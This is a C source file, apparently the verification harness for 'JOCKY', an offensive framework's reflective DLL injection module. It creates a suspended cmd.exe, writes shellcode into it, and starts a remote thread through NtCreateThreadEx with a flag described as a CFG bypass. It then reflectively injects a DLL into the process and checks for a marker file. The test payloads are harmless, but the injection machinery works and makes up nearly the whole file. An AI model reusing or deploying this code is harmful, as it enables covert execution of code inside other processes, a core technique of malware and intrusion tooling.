/*
 * JOCKY — Phase 10 verification harness (cleaned)
 * =================================================
 * Build order:
 *   1. clang -c reflective_loader.c -o reflective_loader.obj \
 *            -fno-stack-protector -O0 -fno-builtin -fPIC -Wno-#warnings
 *   2. clang -shared test_dll/test_dll.c reflective_loader.obj \
 *            -o test_dll/test_dll.dll -lkernel32 -Wno-#warnings
 *   3. clang inject.c reflective_loader.c test_reflect.c \
 *            -o test_reflect.exe -lkernel32 -ladvapi32 -O0 -Wno-#warnings
 *
 * Tests:
 *   A. Local ReflectiveLoader call with raw file bytes
 *   B. Minimal shellcode in cmd.exe to verify remote execution
 *   C. Full remote DLL injection via LoadLibraryW
 */

#include <stdio.h>
#include <stddef.h>
#include <windows.h>

/* ── NtCreateThreadEx for CFG bypass ────────────────────────────────────── */
typedef NTSTATUS (NTAPI *pfnNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    LPVOID ObjectAttributes,
    HANDLE ProcessHandle,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    ULONG Flags,
    SIZE_T StackZeroBits,
    SIZE_T SizeOfStackCommit,
    SIZE_T SizeOfStackReserve,
    LPVOID lpBytesBuffer
);

#define THREAD_CREATE_FLAGS_BYPASS_CFG_AND_APC 0x00000004

/* ── Injector declared in inject.c ─────────────────────────────────────── */
BOOL JOCKY_reflective_inject(LPCWSTR host_path,
                              LPBYTE  dll_bytes,
                              DWORD   dll_size);

#define MARKER_PATH L"C:\\Windows\\Temp\\JOCKY_reflect_test.txt"
#define DLL_PATH    "execution_engine\\reflective_loader\\test_dll\\test_dll.dll"

/* ── VEH handler ────────────────────────────────────────────────────────── */
static volatile BOOL  g_veh_fired = FALSE;
static volatile DWORD g_veh_code  = 0;

static LONG WINAPI veh_handler(PEXCEPTION_POINTERS ep)
{
    g_veh_code  = ep->ExceptionRecord->ExceptionCode;
    g_veh_fired = TRUE;
    return EXCEPTION_CONTINUE_SEARCH;
}

/* ── Read file into VirtualAlloc'd buffer ───────────────────────────────── */
static LPBYTE read_file_raw(const char *path, DWORD *out_size)
{
    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                           NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) { *out_size = 0; return NULL; }
    DWORD sz = GetFileSize(h, NULL);
    LPBYTE buf = (LPBYTE)VirtualAlloc(NULL, sz,
                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    DWORD bread = 0;
    ReadFile(h, buf, sz, &bread, NULL);
    CloseHandle(h);
    *out_size = bread;
    return buf;
}

int main(void)
{
    printf("JOCKY Phase 10 -- Reflective DLL Injection Verification\n");
    printf("=========================================================\n\n");

    /* ════════════════════════════════════════════════════════════════════
     * TEST A — local ReflectiveLoader call
     * ════════════════════════════════════════════════════════════════════ */
    printf("--- TEST A: local ReflectiveLoader ---\n");

    typedef ULONG_PTR (WINAPI *PFN_RL)(LPVOID);

    /* Load DLL to get ReflectiveLoader address */
    HMODULE local_dll = LoadLibraryA(DLL_PATH);
    if (!local_dll) {
        printf("  LoadLibraryA FAILED error=%lu\n", GetLastError());
        return 1;
    }
    PFN_RL local_rl = (PFN_RL)GetProcAddress(local_dll, "ReflectiveLoader");
    if (!local_rl) {
        printf("  GetProcAddress FAILED\n");
        FreeLibrary(local_dll);
        return 1;
    }
    printf("  ReflectiveLoader addr = 0x%llX\n",
           (unsigned long long)(ULONG_PTR)local_rl);

    /* Read raw file bytes */
    DWORD raw_size = 0;
    LPBYTE raw_bytes = read_file_raw(DLL_PATH, &raw_size);
    if (!raw_bytes || !raw_size) {
        printf("  raw read FAILED error=%lu\n", GetLastError());
        FreeLibrary(local_dll);
        return 1;
    }
    printf("  raw bytes: %lu\n", raw_size);

    /* Call ReflectiveLoader with raw bytes */
    g_veh_fired = FALSE;
    g_veh_code = 0;
    PVOID veh = AddVectoredExceptionHandler(1, veh_handler);

    ULONG_PTR rl_result = local_rl((LPVOID)raw_bytes);
    RemoveVectoredExceptionHandler(veh);
    VirtualFree(raw_bytes, 0, MEM_RELEASE);
    FreeLibrary(local_dll);

    if (g_veh_fired) {
        printf("  EXCEPTION 0x%08lX\n", (unsigned long)g_veh_code);
        return 1;
    }
    printf("  returned 0x%llX %s\n",
           (unsigned long long)rl_result,
           rl_result ? "OK" : "FAIL (returned 0)");
    if (!rl_result) {
        printf("  ReflectiveLoader returned 0\n");
        return 1;
    }
    printf("\n--- TEST A: all steps passed ---\n\n");

    /* ════════════════════════════════════════════════════════════════════
     * TEST B — minimal remote shellcode in cmd.exe
     * ════════════════════════════════════════════════════════════════════ */
    printf("--- TEST B: minimal shellcode in cmd.exe ---\n");

    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    pfnNtCreateThreadEx pNtCreateThreadEx =
        (pfnNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
    if (!pNtCreateThreadEx) {
        printf("NtCreateThreadEx not found\n");
        return 1;
    }

    PROCESS_INFORMATION pi;
    STARTUPINFOW        si;
    memset(&pi, 0, sizeof(pi));
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);

    if (!CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", NULL,
                        NULL, NULL, FALSE, CREATE_SUSPENDED,
                        NULL, NULL, &si, &pi))
    {
        printf("CreateProcessW failed error=%lu\n", GetLastError());
        return 1;
    }

    /* Minimal x64 shellcode: mov rax, 0x12345678; ret */
    BYTE shellcode[] = {
        0x48, 0xB8, 0x78, 0x56, 0x34, 0x12, 0x00, 0x00, 0x00, 0x00, 0xC3
    };

    LPVOID remote_code = VirtualAllocEx(
        pi.hProcess, NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote_code) {
        printf("VirtualAllocEx failed error=%lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    if (!WriteProcessMemory(pi.hProcess, remote_code,
                            shellcode, sizeof(shellcode), NULL)) {
        printf("WriteProcessMemory failed error=%lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    printf("Shellcode at 0x%llX\n", (unsigned long long)remote_code);

    HANDLE rthread = NULL;
    NTSTATUS status = pNtCreateThreadEx(
        &rthread, THREAD_ALL_ACCESS, NULL, pi.hProcess,
        (LPTHREAD_START_ROUTINE)remote_code, NULL,
        THREAD_CREATE_FLAGS_BYPASS_CFG_AND_APC,
        0, 0, 0, NULL);

    if (status != 0 || !rthread) {
        printf("NtCreateThreadEx failed, status=0x%lx\n", status);
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    WaitForSingleObject(rthread, 5000);
    DWORD exit_code = 0;
    GetExitCodeThread(rthread, &exit_code);
    CloseHandle(rthread);
    printf("Shellcode returned: 0x%lX (expect 0x12345678)\n", exit_code);

    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    if (exit_code != 0x12345678) {
        printf("Remote execution FAILED\n");
        return 1;
    }
    printf("Minimal remote execution WORKS!\n\n");

    /* ════════════════════════════════════════════════════════════════════
     * TEST C — full remote DLL injection into cmd.exe
     * ════════════════════════════════════════════════════════════════════ */
    printf("--- TEST C: remote injection into cmd.exe ---\n");

    printf("Reading test_dll.dll...           ");
    fflush(stdout);
    DWORD dll_size = 0;
    LPBYTE dll_bytes = read_file_raw(DLL_PATH, &dll_size);
    if (!dll_bytes || !dll_size) {
        printf("FAILED error=%lu\n", GetLastError());
        return 1;
    }
    printf("ok (%lu bytes)\n", dll_size);

    DeleteFileW(MARKER_PATH);

    printf("Injecting into cmd.exe...     ");
    fflush(stdout);
    BOOL ok = JOCKY_reflective_inject(
        L"C:\\Windows\\System32\\cmd.exe",
        dll_bytes, dll_size);
    VirtualFree(dll_bytes, 0, MEM_RELEASE);
    if (!ok) {
        printf("FAILED error=%lu\n", GetLastError());
        return 1;
    }
    printf("ok\n");

    printf("Checking marker file...           ");
    fflush(stdout);
    Sleep(1000);

    if (GetFileAttributesW(MARKER_PATH) != INVALID_FILE_ATTRIBUTES) {
        printf("FOUND\n");
        printf("\nPhase 10 complete.\n");
        return 0;
    } else {
        printf("NOT FOUND -- DllMain did not run\n");
        return 1;
    }
}